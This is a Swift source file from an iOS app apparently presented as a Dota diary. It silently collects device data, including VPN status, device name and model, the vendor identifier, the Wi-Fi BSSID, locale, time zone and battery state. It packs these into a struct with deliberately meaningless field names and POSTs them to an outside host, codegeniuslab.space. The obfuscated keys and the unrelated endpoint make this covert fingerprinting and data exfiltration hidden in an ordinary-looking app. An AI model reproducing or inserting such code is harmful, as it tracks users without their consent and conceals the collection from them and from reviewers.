//
//  DataSend.swift
//  DotaDairy
//
//  Created by Phillip on 17.06.2024.
//

import SwiftUI
import Combine
import NetworkExtension
import SystemConfiguration.CaptiveNetwork

struct DeviceInfo: Codable {
    var vivisWork: Bool
    var gfdokPS: String
    var gdpsjPjg: String
    var poguaKFP: String
    var gpaMFOfa: [String]
    var gciOFm: String?
    var bcpJFs: String
    var GOmblx: String
    var G0pxum: String
    var Fpvbduwm: Bool
    var Fpbjcv: Int
    var bvoikOGjs: [String: String]?
    var gfpbvjsoM: Int
    var gfdosnb: [String]?
    var bpPjfns: String
    var biMpaiuf: Bool
    var oahgoMAOI: Bool
}

class DeviceInfoProvider: ObservableObject {
    private var cancellable: AnyCancellable?
    
    func fetchVPNStatus() -> Bool {
        let vpnManager = NEVPNManager.shared()
        vpnManager.loadFromPreferences { error in
            if let error = error {
                print("Error loading VPN preferences: \(error)")
            }
        }
        return vpnManager.connection.status != .disconnected
    }
    
    func fetchDeviceName() -> String {
        return UIDevice.current.name
    }
    
    func fetchDeviceModel() -> String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let modelCode = withUnsafePointer(to: &systemInfo.machine) {
            $0.withMemoryRebound(to: CChar.self, capacity: 1) {
                String(validatingUTF8: $0)
            }
        }
        return modelCode ?? "Unknown Model"
    }
    
    func fetchUniqueNumber() -> String {
        return UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidString
    }
    
    func fetchWifiAddress() -> [String] {
        var address: [String] = []
        if let interfaces = CNCopySupportedInterfaces() as NSArray? {
            for interface in interfaces {
                if let interfaceInfo = CNCopyCurrentNetworkInfo(interface as! CFString) as NSDictionary? {
                    if let bssid = interfaceInfo[kCNNetworkInfoKeyBSSID as String] as? String {
                        address.append(bssid)
                    }
                }
            }
        }
        return address
    }
    
    func fetchDeviceInfo() -> DeviceInfo {
        let vpnStatus = fetchVPNStatus()
        let deviceName = fetchDeviceName()
        let deviceModel = fetchDeviceModel()
        let uniqueNumber = fetchUniqueNumber()
        let wifiAddress = fetchWifiAddress()
        let simCard: String? = nil
        let iosVersion = UIDevice.current.systemVersion
        let deviceLanguage = Locale.current.languageCode ?? "Unknown"
        let timeZone = TimeZone.current.identifier
        let isCharging = UIDevice.current.batteryState == .charging
        let storageCapacity = Int(ProcessInfo.processInfo.physicalMemory / 1_000_000)
        let someApps: [String: String]? = nil
        let batteryPercentage = Int(UIDevice.current.batteryLevel * 100)
        let deviceKeyboards: [String]? = nil
        let region = Locale.current.regionCode ?? "Unknown"
        let isMetricSystem = Locale.current.usesMetricSystem
        let isBatteryFull = UIDevice.current.batteryState == .full
        
        return DeviceInfo(
            vivisWork: vpnStatus,
            gfdokPS: deviceName,
            gdpsjPjg: deviceModel,
            poguaKFP: uniqueNumber,
            gpaMFOfa: wifiAddress,
            gciOFm: simCard,
            bcpJFs: iosVersion,
            GOmblx: deviceLanguage,
            G0pxum: timeZone,
            Fpvbduwm: isCharging,
            Fpbjcv: storageCapacity,
            bvoikOGjs: someApps,
            gfpbvjsoM: batteryPercentage,
            gfdosnb: deviceKeyboards,
            bpPjfns: region,
            biMpaiuf: isMetricSystem,
            oahgoMAOI: isBatteryFull
        )
    }
    
    func sendDeviceInfo() {
        let deviceInfo = fetchDeviceInfo()
        guard let url = URL(string: "codegeniuslab.space/app/x1xb4tt") else { return }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        do {
            let jsonData = try JSONEncoder().encode(deviceInfo)
            request.httpBody = jsonData
        } catch {
            print("Error encoding JSON: \(error)")
            return
        }
        
        cancellable = URLSession.shared.dataTaskPublisher(for: request)
            .sink(receiveCompletion: { completion in
                switch completion {
                case .failure(let error):
                    print("Error sending data: \(error)")
                case .finished:
                    break
                }
            }, receiveValue: { _ in
                print("Data sent successfully")
            })
    }
}
